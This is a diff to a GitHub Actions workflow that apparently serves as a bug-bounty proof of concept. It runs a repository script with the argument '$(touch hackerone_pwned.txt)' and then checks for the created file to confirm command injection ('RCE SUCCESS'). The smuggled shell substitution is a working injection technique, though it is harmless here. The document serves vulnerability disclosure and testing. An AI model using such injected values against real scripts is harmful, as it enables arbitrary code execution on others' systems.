@@ -1,10 +1,32 @@
-# .github/workflows/test.yml
-on: [pull_request]
+name: RCE Test
+on:
+  pull_request:
+    types: [opened, synchronize]
+
 jobs:
-  test:
+  exploit:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - run: chmod +x scripts/get-package-json-key.sh
-      - run: ./scripts/get-package-json-key.sh '$(touch pwned.txt)' OUT
-      - run: ls -la pwned.txt && echo "RCE SUCCESS"
+
+      - name: Make script executable
+        run: chmod +x scripts/get.sh
+
+      - name: Run vulnerable script with malicious KEY
+        env:
+          GITHUB_OUTPUT: /tmp/github_output
+        run: |
+          ./scripts/get.sh '$(touch hackerone_pwned.txt)' EXPLOIT_OUTPUT
+
+      - name: Verify RCE
+        run: |
+          echo "=== FILES IN WORKDIR ==="
+          ls -la
+          if [ -f "hackerone_pwned.txt" ]; then
+            echo "[+] RCE SUCCESS: File created by command injection!"
+            cat hackerone_pwned.txt
+            exit 0
+          else
+            echo "[-] FAILED: No file created."
+            exit 1
+          fi
